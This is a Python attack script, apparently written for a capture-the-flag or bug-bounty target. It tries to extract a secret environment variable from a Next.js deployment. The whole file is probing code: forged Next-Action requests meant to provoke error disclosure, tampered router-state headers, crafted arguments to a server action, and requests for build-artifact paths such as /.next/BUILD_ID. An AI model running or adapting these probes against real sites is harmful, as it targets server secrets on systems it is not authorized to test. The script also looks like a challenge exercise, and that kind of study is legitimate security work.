#!/usr/bin/env python3
"""
Final creative attempts to extract the flag
"""

import requests
import json

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

print("[*] Attempting to extract VERCEL_PLATFORM_PROTECTION")
print("="*70)

# Attempt 1: What if we send a malformed payload that triggers an error with env vars?
print("\n[1] Trying to trigger error disclosure...")
try:
    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': 'text/plain',  # Wrong content type
        'Accept': 'text/x-component',
    }
    response = requests.post(TARGET, data="INVALID_DATA", headers=headers)
    print(f"Status: {response.status_code}")
    if "VERCEL" in response.text or "process.env" in response.text:
        print("[!!!] Found in error response:")
        print(response.text[:1000])
except Exception as e:
    print(f"Error: {e}")

# Attempt 2: Try accessing process.env via the legitimate action by modifying the Next-Router-State-Tree header
print("\n[2] Trying header manipulation...")
try:
    headers = {
        'Next-Action': ACTION_ID,
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2C%22%24undefined%22%2C%22%24undefined%22%2Ctrue%5D',
        'Content-Type': 'application/json',
        'Accept': 'text/x-component',
    }
    response = requests.post(TARGET, json={"env": "VERCEL_PLATFORM_PROTECTION"}, headers=headers)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:500]}")
    if "VERCEL_PLATFORM_PROTECTION" in response.text:
        print("[!!!] FLAG FOUND!")
except Exception as e:
    print(f"Error: {e}")

# Attempt 3: What if the sayHello action itself leaks the env var? Try sending arguments to it
print("\n[3] Trying to pass arguments to sayHello action...")
for payload in [
    [{"env": "VERCEL_PLATFORM_PROTECTION"}],
    ["VERCEL_PLATFORM_PROTECTION"],
    {"key": "VERCEL_PLATFORM_PROTECTION"},
]:
    try:
        headers = {
            'Next-Action': ACTION_ID,
            'Content-Type': 'application/json',
            'Accept': 'text/x-component',
        }
        response = requests.post(TARGET, json=payload, headers=headers)
        if "VERCEL" in response.text and "Hello World" not in response.text:
            print(f"\n[!!!] Interesting response for payload {payload}:")
            print(response.text)
    except:
        pass

# Attempt 4: Maybe the build ID reveals something?
print("\n[4] Checking build artifacts...")
build_id = "bIW_p-jXOXL69_fsJ2_vY"
paths = [
    f"/_next/server/app/{build_id}",
    f"/_next/data/{build_id}/index.json",
    f"/.next/BUILD_ID",
]
for path in paths:
    try:
        response = requests.get(f"{TARGET}{path}")
        if response.status_code == 200 and len(response.text) < 1000:
            print(f"\n[+] Found {path}:")
            print(response.text[:500])
    except:
        pass

print("\n" + "="*70)
print("[*] Exploration complete")
